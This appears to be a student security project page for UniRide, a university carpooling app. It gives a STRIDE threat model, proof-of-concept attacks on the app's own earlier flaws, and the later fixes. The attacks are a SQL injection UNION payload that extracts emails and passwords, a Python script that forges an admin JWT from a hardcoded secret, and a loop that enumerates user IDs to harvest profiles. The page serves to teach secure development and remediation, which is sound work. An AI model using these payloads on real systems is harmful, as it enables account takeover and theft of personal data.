The Problem
Getting Around Karachi
Habib University students face long commutes, unreliable public transport, and real safety concerns every day.
Challenge 01
Long Commutes
Students travel from across the city with no reliable fast route to campus.
Challenge 02
Unreliable Transport
Public transit is inconsistent. Private transport is expensive. Ride-hailing is not always safe.
Challenge 03
Safety Concerns
Travelling alone or with strangers carries risk. A university-scoped platform reduces that surface.
The Solution
UniRide
A carpooling platform connecting drivers and passengers within the Habib University community — reducing costs, enhancing safety, and improving access to transport.
Goal 01
Reduce Costs
Shared rides split fuel and toll costs between driver and passengers on the same route.
Goal 02
Enhance Safety
University email verification means every user is a known Habib student — not a stranger.
Goal 03
Improve Access
Students without personal vehicles can reliably find rides with classmates going the same way.
Features
What It Does
Authentication and role-based access control across three roles. Full driver and passenger workflows. Real-time messaging.
Auth & RBAC
Identity & Access
University email OTP registration. JWT sessions. Driver, Passenger, and Admin roles enforced on every endpoint.
Driver Side
Ride Management
Create rides with origin, destination, seats, and price. Vehicle management. Accept or reject booking requests. Dashboard overview.
Passenger Side
Search & Book
Search rides by route. Request a seat with custom pickup and dropoff location. View upcoming and past ride history.
Messaging
In-app Chat
Real-time SignalR messaging between driver and passengers on the same ride. One conversation per ride.
Non-functional
Scale & Performance
Supports 10–20 concurrent users. WebSocket-driven live updates. Dynamic content loading without full page refreshes.
Admin Panel
Platform Control
View platform statistics. Manage all users and rides. Cancel active rides. Seeded on first run.

Threat Model · STRIDE
Six Categories. Full Coverage.
Every component mapped to STRIDE. Attack surface and pre-remediation abuse cases were defined before the pipeline ran a single scan.
Spoofing
JWT Forgery
Hardcoded weak secret. Any attacker with source access can mint tokens of any role.
Tampering
SQL Injection
Unsanitised string concatenation inside a raw SQL query in the ride search endpoint.
Repudiation
No Audit Logging
Zero server-side logging of authentication events, failed logins, or admin actions.
Information Disclosure
IDOR + Stack Traces
Sequential user IDs with no ownership check. Full exceptions returned in 500 responses.
Denial of Service
OTP Flood
No rate limit on /send-otp. Unlimited SMTP relay via the application server.
Elevation of Privilege
Role Self-Assignment
Pre-remediation risk: users could request privileged roles unless the server enforced role ownership.

Unsanitised user input concatenated directly into a raw SQL query. Detectable by SAST, exploitable from the search box.

  • 02Enumerate schema: %' UNION SELECT 1,email,password,4,5,6 FROM Users--

JWT Forgery
The signing secret is in the source code. Anyone with repository access can forge a token for any user and any role.
# Secret exposed by SonarCloud rule S6703 # "Jwt:Key": "YourSuperSecretKey123456789101112" import jwt, time forged = jwt.encode({ "nameid": "1", "role": "admin", "email": "attacker@hu.edu.pk", "exp": int(time.time()) + 86400 }, "YourSuperSecretKey123456789101112") # Use forged token against admin endpoints curl /api/admin/users -H "Authorization: Bearer {forged}"
  • 01SonarCloud scan reveals hardcoded secret in appsettings.json
  • 02Forge token with role: admin and any userId using python-jwt
  • 03Send forged token — /api/admin/users returns all user records
  • 04Full platform takeover. No valid credentials required.

IDOR
No ownership check. Any authenticated user can read any other user's profile by incrementing an integer ID.
// PassengerProfileController.cs — no ownership check [HttpGet("user/{userId}")] public async Task<IActionResult> GetUserProfile(int userId) { var user = await _context.Users.FindAsync(userId); if (user == null) return NotFound(); return Ok(new { user.UserId, user.FullName, user.UniversityEmail, user.PhoneNumber }); } # Enumerate all users — any valid JWT works for id in range(1, 500): curl /api/passengerprofile/user/{id} -H "Authorization: Bearer {jwt}"

  • 02GET /api/passengerprofile/user/1 — returns admin profile
  • 03Iterate user IDs 1–N to enumerate the entire user base
  • 04Leaks full names, university emails, phone numbers

Remediation
Root Cause Fixes
All critical and high findings were remediated at root cause, and the final main-branch pipeline passed SAST, SCA, and DAST.
SQL Injection
LINQ + EF Functions
Removed raw SQL concatenation. Search now uses EF.Functions.Like with normal query composition.
JWT Secret
Environment Variable
Default config no longer stores the key. Runtime key now comes from environment / GitHub Secrets.
IDOR
Ownership Enforcement
JWT userId claim must match requested {userId}. Returns 403 Forbidden otherwise.
Error Disclosure
Generic Error Response
Removed ex.ToString() from responses. Errors logged server-side only via ILogger.
OTP
Crypto RNG + TTL + Lockout
RandomNumberGenerator replaces new Random(). 10-minute expiry, resend throttle, and 5-attempt lockout added.
Dependencies
Package Updates
vite, rollup, axios, minimatch updated to patched versions. Unused packages removed.
